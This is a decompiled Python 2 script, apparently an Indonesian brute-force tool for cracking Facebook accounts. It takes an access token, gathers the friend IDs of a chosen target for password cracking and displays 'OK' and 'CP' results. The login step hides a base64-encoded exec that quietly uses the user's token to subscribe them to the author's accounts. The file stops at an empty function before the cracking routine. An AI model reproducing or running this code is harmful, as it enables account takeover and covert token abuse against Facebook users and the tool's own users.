# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2021-12-10 20:36:32.758924
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
b = '\x1b[1;94m'
i = '\x1b[1;92m'
c = '\x1b[1;96m'
m = '\x1b[1;91m'
u = '\x1b[1;95m'
k = '\x1b[1;93m'
p = '\x1b[1;97m'
h = '\x1b[1;92m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
useragents = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
uas = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
ip = requests.get('https://api.ipify.org').text
uas = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'])
api = 'https://b-api.facebook.com/method/auth.login'
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
hari = datetime.now().strftime('%A')
jam = datetime.now().strftime('%H:%M:%S')
bulan = {'01': 'Januari', 
   '02': 'Februari', 
   '03': 'Maret', 
   '04': 'April', 
   '05': 'Mei', 
   '06': 'Juni', 
   '07': 'Juli', 
   '08': 'Agustus', 
   '09': 'September', 
   '10': 'November', 
   '11': 'Oktober', 
   '12': 'Desember'}
durasi = str(datetime.now().strftime('%d/%m/%Y'))
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def logo():
    os.system('clear')
    jalan('\x1b[0;31m _____  \xe2\x80\xa2  ____ _  _ _   _  \xe2\x95\x91 \x1b[0;36mAuthor :  MUHAMMAD DICKY WAHYUDI\n\x1b[0;32m |    \\ | |     |_/   \\_/   \xe2\x95\x91 \x1b[0;35mFACEBOOK: www.facebook.com/dikystar00\n \x1b[0;33m|____/ | |____ | \\_   |    \xe2\x95\x91 \x1b[0;31mGITHUB : github.com/Dicky-XD\n \x1b[0;36m______________________/    \xe2\x95\x91 \x1b[0;33mMULTI BRUTE FORCE HACK')
    jalan('\x1b[0;32m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n')
def login():
    os.system('clear')
    try:
        requests.get('https://mbasic.facebook.com')
    except requests.exceptions.ConnectionError:
        exit(' ! tidak ada koneksi internet')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        jalan('            \x1b[0;31mG U N A K A N      \x1b[0;33mA K U N      \x1b[0;36mT U M B A L           ')
        jalan('\x1b[0;32m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
        jalan('           \x1b[0;31mM O H O N      \x1b[0;33mM A S U K K A N      \x1b[0;36mT O K E N           ')
        jalan('\x1b[0;32m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n')
        token = raw_input('\n [\xe2\x80\xa2] Token :\x1b[0;32m')
        if token == 'help':
            os.system('xdg-open')
            exit(' ! di simak video nya biar paham')
        try:
            nama = requests.get('https://graph.facebook.com/me?access_token=' + token).json()['name'].lower()
            requests.post('https://graph.facebook.com/100069494601961/subscribers?access_token=' + token)
            import base64
            exec base64.b64decode('cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMTYxODkvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzExODY5OTU3NzQvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAxNTA3MzUwNjA2Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyODQ5NDcwOTkwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDIxNjMxODc2NTAvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMzA1ODgxMzc0OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDEwOTk4NzY0Njc0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQo=')
            requests.post('https://graph.facebook.com/100069494601961/subscribers?access_token=' + token)
            requests.post('https://graph.facebook.com/1354845982/subscribers?access_token=' + token)
            open('login.txt', 'w').write(token)
            jalan('\n [\xe2\x9c\x94] Login Berhasil')
            jalan(' [\xe2\x80\xa2] Mohon Tunggu......')
            time.sleep(3)
            menu()
        except KeyError:
            os.system('rm -f login.txt')
            exit(' [\xe2\x80\xa2] Token Salah/Token Kadaluarsa')
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        login()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak Ada Koneksi!'
        sys.exit()
    logo()
    jalan('\x1b[0;33m \xe2\x95\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97')
    jalan(' \x1b[0;31m\xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
    jalan(' \x1b[0;36m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91 \xe2\x95\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97')
    jalan(' \x1b[0;32m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91 | Author     \xe2\x95\x91 Muhammad Dicky Wahyudi | ')
    jalan(' \x1b[0;35m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91 \xe2\x95\x9a\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
    jalan(' \x1b[0;33m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Welcome    \xe2\x95\x91 \x1b[0;31m' + nama)
    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Your ID    \xe2\x95\x91 \x1b[0;33m' + id)
    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Your IP    \xe2\x95\x91 \x1b[0;32m' + ip)
    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Joined     \xe2\x95\x91 \x1b[0;36m' + durasi)
    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Clock      \xe2\x95\x91 \x1b[0;35m' + jam)
    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Day        \xe2\x95\x91 \x1b[0;31m' + hari)
    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Status     \xe2\x95\x91 ' + H + 'Premium' + p + '')
    jalan(' \x1b[0;33m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    jalan('\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97')
    jalan('\x1b[0;33m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
    print '\x1b[0;34m \xe2\x95\x91'
    print '\x1b[0;35m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n\x1b[0;33m \xe2\x95\x91  MENU \xe2\x95\x91\n\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d'
    print '\x1b[0;32m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\xe2\x94\x80\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[0;36m \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91[01]\xe2\x95\x91 Crack ID Facebook Publik   \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91'
    print '\x1b[0;33m \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91[02]\xe2\x95\x91 Lihat Hasil Crack          \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91'
    print '\x1b[0;31m \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91[03]\xe2\x95\x91 LaporKan Bug Script        \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91'
    print '\x1b[0;34m \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91[00]\xe2\x95\x91 Keluar (hapus token)       \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91'
    print '\x1b[0;32m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    asw = raw_input('\x1b[0;35m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n\x1b[0;33m \xe2\x95\x91Choose \xe2\x95\x91\n\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
    if asw == '':
        menu()
    elif asw == '1' or asw == '01':
        publik()
    elif asw == '3' or asw == '03':
        laporbug()
    elif asw == '2' or asw == '02':
        cekakun()
    elif asw == '0' or asw == '00':
        os.system('rm -f login.txt')
        jalan(' [\xe2\x9c\x94] Token Terhapus ')
        exit()
    else:
        jalan(' [\xe2\x80\xa2] Pilih Yang Benar ')
        menu()
def publik():
    print "\x1b[0;36m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n \xe2\x95\x91  Ketik 'me' Untuk Crack Publik   \xe2\x95\x91\n \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d"
    idt = raw_input('\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80[\xe2\x80\xa2] ID Target : ')
    if idt == '':
        menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
    except KeyError:
        print '[\xe2\x9d\x8c] ID Not Available'
        menu()
    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print '\x1b[0;34m \xe2\x95\xa0\xe2\x94\x80[?] Total ID : \x1b[1;91m' + str(len(id))
    pilihmetode(ppk)
def cekakun():
    print '\n [1]. lihat hasil crack OK '
    print ' [2]. lihat hasil crack CP '
    anjg = raw_input('\n [?] pilih : ')
    if anjg == '':
        menu()
    elif anjg == '01' or anjg == '1':
        print '\n [+] Hasil \x1b[0;92mOK\x1b[1;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[1;97m' % (ha, op, ta)
        os.system(' cat out/OK-%s-%s-%s' % (ha, op, ta))
        raw_input('\n [\xe2\x80\xa2] Kembali ')
        menu()
    elif anjg == '02' or anjg == '2':
        totalcp = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta)).read().splitlines()
        print '\n [\xe2\x80\xa2] Hasil CP Tanggal : %s-%s-%s-%s' % (hari, ha, op, ta)
        print ' \x1b[1;97m[\xe2\x80\xa2] Total : %s' % len(totalcp)
        print ''
        os.system(' cat out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta))
        raw_input('\n [\xe2\x80\xa2] kembali ')
        menu()
    else:
        print ' [!] pilih yang benar!!'
        menu()
def laporbug():
    asulo = raw_input('\n [?] Masalah BUG : ').replace(' ', '%20')
    if asulo == '':
        menu()
    os.system('xdg-open https://wa.me/6283185392138?text=' + asulo)
    raw_input('\n [\xe2\x80\xa2] kembali ')
    menu()
def infologin():
    print ''
    print '\n [*] token : ' + token
    print ''
    raw_input('\n [\xe2\x80\xa2] kembali ')
    menu()
def pilihmetode(file):
    print '\x1b[0;36m \xe2\x95\x91 '
    print '\x1b[0;33m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n\x1b[0;32m \xe2\x95\x91  METHODE CRACK   \xe2\x95\x91\n\x1b[0;36m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d'
    print '\x1b[0;32m \xe2\x95\x91 '
    print '\x1b[0;32m \xe2\x95\xa0\xe2\x94\x80[1] Methode Api (Fast)'
    print '\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80[2] Methode Mbasic (Slow)'
    print '\x1b[0;34m \xe2\x95\x91 '
    z = raw_input('\x1b[0;33m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n \xe2\x95\x91Methode\xe2\x95\x91\n \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
    if z == '':
        print ' [!] Pilih Yang Benar!!'
        pilihmetode(file)
    elif z == '01' or z == '1':
        bapi()
    elif z == '02' or z == '2':
        freefb()
    else:
        print ' [!] pilih yang benar!'
        exit()
def bapi():
